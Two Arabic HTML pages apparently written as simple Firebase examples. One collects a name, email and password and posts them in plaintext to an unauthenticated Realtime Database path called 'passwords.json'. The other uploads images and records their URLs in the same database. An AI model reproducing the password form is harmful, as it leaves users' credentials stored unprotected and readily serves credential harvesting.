<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>موقع استقبال البيانات</title>
</head>
<body>
    <h1>أدخل بياناتك</h1>
    <form id="dataForm">
        <label for="name">الاسم:</label>
        <input type="text" id="name" placeholder="أدخل اسمك" required>
        <br><br>
        <label for="email">البريد الإلكتروني:</label>
        <input type="email" id="email" placeholder="أدخل بريدك الإلكتروني" required>
        <br><br>
        <label for="password">كلمة المرور:</label>
        <input type="password" id="password" placeholder="أدخل كلمة المرور" required>
        <br><br>
        <button type="submit">إرسال</button>
    </form>

    <script>
        // استقبال البيانات من النموذج
        document.getElementById('dataForm').addEventListener('submit', function(event) {
            event.preventDefault(); // منع إعادة تحميل الصفحة

            // جمع البيانات من الحقول
            const name = document.getElementById('name').value;
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;

            // إرسال البيانات إلى Firebase
            saveData({ name, email, password });
        });

        // دالة إرسال البيانات إلى Firebase
        async function saveData(data) {
            try {
                const response = await fetch('https://adminhtml-411ea-default-rtdb.firebaseio.com/passwords.json', {
                    method: 'POST',
                    body: JSON.stringify(data),
                    headers: {
                        'Content-Type': 'application/json'
                    }
                });
                const result = await response.json();
                console.log('تم إرسال البيانات بنجاح:', result);
                alert('تم إرسال البيانات بنجاح!');
            } catch (error) {
                console.error('حدث خطأ أثناء إرسال البيانات:', error);
                alert('حدث خطأ أثناء إرسال البيانات. يرجى المحاولة مرة أخرى.');
            }
        }
    </script>
</body>
</html>
<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تحميل الصور</title>
</head>
<body>
    <h1>تحميل صورة</h1>
    <input type="file" id="imageInput" accept="image/*">
    <button onclick="uploadImage()">تحميل</button>

    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-storage.js"></script>
    <script>
        // تهيئة Firebase
        const firebaseConfig = {
            apiKey: "YOUR_API_KEY",
            authDomain: "YOUR_AUTH_DOMAIN",
            projectId: "YOUR_PROJECT_ID",
            storageBucket: "YOUR_STORAGE_BUCKET",
            messagingSenderId: "YOUR_MESSAGING_SENDER_ID",
            appId: "YOUR_APP_ID"
        };
        firebase.initializeApp(firebaseConfig);

        // دالة تحميل الصورة
        function uploadImage() {
            const file = document.getElementById('imageInput').files[0];
            if (file) {
                const storageRef = firebase.storage().ref('images/' + file.name);
                const uploadTask = storageRef.put(file);

                uploadTask.on('state_changed', 
                    (snapshot) => {
                        // يمكنك عرض تقدم التحميل هنا
                        const progress = (snapshot.bytesTransferred / snapshot.totalBytes) * 100;
                        console.log('التقدم: ' + progress + '%');
                    },
                    (error) => {
                        // معالجة الأخطاء
                        console.error('حدث خطأ أثناء التحميل:', error);
                        alert('حدث خطأ أثناء التحميل. يرجى المحاولة مرة أخرى.');
                    },
                    () => {
                        // التحميل اكتمل بنجاح
                        uploadTask.snapshot.ref.getDownloadURL().then((downloadURL) => {
                            console.log('تم تحميل الصورة بنجاح. الرابط:', downloadURL);
                            alert('تم تحميل الصورة بنجاح!');
                            // يمكنك تخزين الرابط في Realtime Database هنا
                            saveImageURL(downloadURL);
                        });
                    }
                );
            } else {
                alert('يرجى اختيار صورة أولاً.');
            }
        }

        // دالة تخزين رابط الصورة في Realtime Database
        async function saveImageURL(url) {
            try {
                const response = await fetch('https://adminhtml-411ea-default-rtdb.firebaseio.com/images.json', {
                    method: 'POST',
                    body: JSON.stringify({ url: url }),
                    headers: {
                        'Content-Type': 'application/json'
                    }
                });
                const result = await response.json();
                console.log('تم تخزين الرابط بنجاح:', result);
            } catch (error) {
                console.error('حدث خطأ أثناء تخزين الرابط:', error);
            }
        }
    </script>
</body>
</html>
